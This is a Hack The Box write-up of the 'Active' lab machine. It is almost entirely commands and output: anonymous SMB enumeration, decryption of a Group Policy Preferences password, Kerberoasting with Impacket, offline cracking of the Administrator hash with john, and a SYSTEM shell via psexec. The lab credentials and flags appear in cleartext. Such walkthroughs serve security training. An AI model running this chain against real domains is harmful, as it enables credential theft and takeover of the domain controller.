+++
title = "HTB Writeup - Active (Easy)"
author = "CyberSpider"
description = "Writeup of Active from Hack The Box."
tags = ['htb', 'easy', 'windows', 'ActveDirectory']
lastmod = 2023-07-21
draft = false
+++

The `Active` machine is an easy windows box.

## Nmap Scan

I do a `nmap scan`:

```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV  -A  10.10.10.100    
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-19 23:04 EDT
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 28.40% done; ETC: 23:04 (0:00:08 remaining)
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 55.56% done; ETC: 23:05 (0:00:10 remaining)
Nmap scan report for 10.10.10.100
Host is up (0.12s latency).
Not shown: 982 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-20 03:04:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-20T03:05:39
|_  start_date: 2023-07-19T18:12:08
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.27 seconds
```

## SMB Enumeration

I see the version of `SMB`:

```sh
┌──(kali㉿kali)-[~]
└─$ nmap  -p445 --script smb-protocols 10.10.10.100
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-19 23:08 EDT
Nmap scan report for 10.10.10.100
Host is up (0.12s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     2:0:2
|_    2:1:0

Nmap done: 1 IP address (1 host up) scanned in 4.37 seconds
```

I list the `shares`:

```sh
┌──(kali㉿kali)-[~]
└─$ smbclient -N -L //10.10.10.100/445
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```


I connect to this `Replication` share and download a few files:

```sh
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.10.100/Replication
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                5217023 blocks of size 4096. 311066 blocks available
smb: \> cd  active.htb
smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018
  Policies                            D        0  Sat Jul 21 06:37:44 2018
  scripts                             D        0  Wed Jul 18 14:48:57 2018

                5217023 blocks of size 4096. 311066 blocks available
smb: \active.htb\> cd Policies
smb: \active.htb\Policies\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 06:37:44 2018
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 06:37:44 2018

                5217023 blocks of size 4096. 311066 blocks available
smb: \active.htb\Policies\> cd {31B2F340-016D-11D2-945F-00C04FB984F9}
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPT.INI                             A       23  Wed Jul 18 16:46:06 2018
  Group Policy                        D        0  Sat Jul 21 06:37:44 2018
  MACHINE                             D        0  Sat Jul 21 06:37:44 2018
  USER                                D        0  Wed Jul 18 14:49:12 2018

                5217023 blocks of size 4096. 311066 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd "Group Policy"
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPE.INI                             A      119  Wed Jul 18 16:46:06 2018

                5217023 blocks of size 4096. 311066 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\> get  GPE.INI 
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as GPE.INI (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\> cd ..
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPT.INI                             A       23  Wed Jul 18 16:46:06 2018
  Group Policy                        D        0  Sat Jul 21 06:37:44 2018
  MACHINE                             D        0  Sat Jul 21 06:37:44 2018
  USER                                D        0  Wed Jul 18 14:49:12 2018

                5217023 blocks of size 4096. 311050 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> get GPT.INI
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as GPT.INI (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd MACHINE 
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Microsoft                           D        0  Sat Jul 21 06:37:44 2018
  Preferences                         D        0  Sat Jul 21 06:37:44 2018
  Registry.pol                        A     2788  Wed Jul 18 14:53:45 2018

                5217023 blocks of size 4096. 311050 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> cd Registry.pol 
cd \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol\: NT_STATUS_NOT_A_DIRECTORY
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Microsoft                           D        0  Sat Jul 21 06:37:44 2018
  Preferences                         D        0  Sat Jul 21 06:37:44 2018
  Registry.pol                        A     2788  Wed Jul 18 14:53:45 2018

                5217023 blocks of size 4096. 311050 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> get Registry.pol
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Registry.pol (5.8 KiloBytes/sec) (average 2.0 KiloBytes/sec)
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> cd Preferences
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups                              D        0  Sat Jul 21 06:37:44 2018

                5217023 blocks of size 4096. 311050 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\> cd Groups
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018
```

I read this file `Groups.xml`:

```sh
┌──(kali㉿kali)-[~/Active]
└─$ cat  Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

I `decode` this hash:

```sh
┌──(kali㉿kali)-[~/Active]
└─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

Credentials:
```
active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

I see the `Share`:

```sh
┌──(kali㉿kali)-[~/Active]
└─$ smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18    
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

I connect in this Share `Users`:

```sh
┌──(kali㉿kali)-[~/Active]
└─$ smbclient //10.10.10.100/Users -U SVC_TGS           
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> whoami
whoami: command not found
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 311050 blocks available
smb: \> cd SVC_TGS 
smb: \SVC_TGS\> ls
  .                                   D        0  Sat Jul 21 11:16:32 2018
  ..                                  D        0  Sat Jul 21 11:16:32 2018
  Contacts                            D        0  Sat Jul 21 11:14:11 2018
  Desktop                             D        0  Sat Jul 21 11:14:42 2018
  Downloads                           D        0  Sat Jul 21 11:14:23 2018
  Favorites                           D        0  Sat Jul 21 11:14:44 2018
  Links                               D        0  Sat Jul 21 11:14:57 2018
  My Documents                        D        0  Sat Jul 21 11:15:03 2018
  My Music                            D        0  Sat Jul 21 11:15:32 2018
  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
  My Videos                           D        0  Sat Jul 21 11:15:53 2018
  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
  Searches                            D        0  Sat Jul 21 11:16:24 2018

                5217023 blocks of size 4096. 311050 blocks available
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Wed Jul 19 14:13:20 2023

                5217023 blocks of size 4096. 311050 blocks available
```

I take the `user flag`:

```sh
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> 
```

## Privilege Escalation

I search this script `GetUserSPNs.py`:

```sh
┌──(kali㉿kali)-[~]
└─$ locate GetUserSPNs.py
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py
```

### Kerberoasting 

I get a list of `SPNs` on the target Windows domain:

```sh
┌──(kali㉿kali)-[~]
└─$ cd /usr/share/doc/python3-impacket/examples/

┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-07-20 02:34:38.561772             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$0ed19e3ceaaad5c79c896826fa8fb918$c10fb7d9078cefce4cf9032760f7fe62163d5c2a07f4e64757e4ec8fa539c4111a6bd8351ba6c095a11fdd19fc7b6a1db9b80b9c53ff856d1b189197534d24cf509d484c0466163199690e81ae7767affb40f02eaca7ea594f150097a5d7b24f21494ea34289607d635c748a1e4832041234ea315b1dbd41a7095369b8dfa63d877b6747239560855afa81bb0204f7d73c756ecf945502e58791aba199d2ca8fc99e3d7700043ff30eb15bb66b90eaf47b8f1280f4204546769e411f9eee10dde475311a76503939f31116dbeb10e95552c2eb32faa444cd0f0e83b9c2a79fc3fb358573b5e155519cb19dfbac8cc4e953135cb1d25050a1fb5f72b9ddd37399cf8a7de3277a2841a6cc91b80da9a65a26f58d080846afac4e8e3f1ea7d6ce7300fc7e382b7a1574efbcb2dcd39bbba63050d30fc21100d96549973fa24512330f728ebbc2cf1d0c5bfac71ffba7de0b84a59b3e30da13c983623d8b17a15763588e8dffc24ce8dde70b58c80093940c0c8f03f4a607043b260765b98d8367425ece4109335da423a69de6803c30f575144b5c1bc00b9103bcf76b756fc57839aaa061060f25b0780e1d83321681862d6c590630c9581a25ae86caff1faef5227afff65ee1f74b6a0a84b28d23462b100ffd77fbbeb8ccb399b254bb125bd5b219b056695735bfbacd8da0e70ffdbc1cb27f2b1ba42670e8e86fe184772e8e1aa094df8d71ca301685505812ee615b60b307e2edad80732d7acfde76ca3bc1b4245f28fb4dd8a652648675eabc96932b1055c1ea7a899f5f59d09041af46955a0c7d2c9eee9322f87f772de6317bb50ee0614f679bb3f45099f2c3d3e34ed14a6e09af45ca52fcb6380b005f38301f931e3040a26be5e8b3a41037edd3f6ab05cb49c6a178b8548869fc2cf80572a01104886780f07cff9d7a87ae7b6f4081f91ce4e4e3ac8cfd37f8a765ce99345f3e615b5a47093c0400c12da33a2e688a9c026732861595fdf5ab1d0c77aaf5d373550201bd5cf80786499709c91f84a5acca5daad02a45d4d8f984ce9f7677aab7a96edf175841d98659902c05259fbdbc61609efedc3378c26588c1c46dd088fc84ba46533b020521c395581f903b5af9e0ad07aaaff20020782bd497eb3207ff00d4362eecd4b82efd212b7fe9ea56d4184b2def1eedf47fcf509db8095a3c7ff68d0e62e750883c73b3b68339c3a4073c33d91f4672ab3dea4c4aed659aa77cbfd448d1e4ca64fd512e
```

I put this hash inside a file and I `crack` the hash with `john` :

```sh
┌──(kali㉿kali)-[~/Active]
└─$ nano hash   

┌──(kali㉿kali)-[~/Active]
└─$ john hash -wordlist:/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:16 DONE (2023-07-20 06:06) 0.06242g/s 657769p/s 657769c/s 657769C/s Tiffani1432..Tiago_18
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Credentials:
```
Administrator:Ticketmaster1968
```

I use `psexec.py` to  log on in the Machine:

```sh
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 psexec.py Administrator@10.10.10.100
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file UotrqOeE.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service USFz on 10.10.10.100.....
[*] Starting service USFz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator\Desktop
 
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\Administrator\Desktop

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
21/01/2021  07:49 ��    <DIR>          .

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
21/01/2021  07:49 ��    <DIR>          ..

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
20/07/2023  09:34 ��                34 root.txt

               1 File(s)             34 bytes
               2 Dir(s)   1.144.229.888 bytes free
```

I get the `root flag`:

```
C:\Users\Administrator\Desktop> type root.txt
e5b694fc24aadcd20fe30b6f98ab67d2
```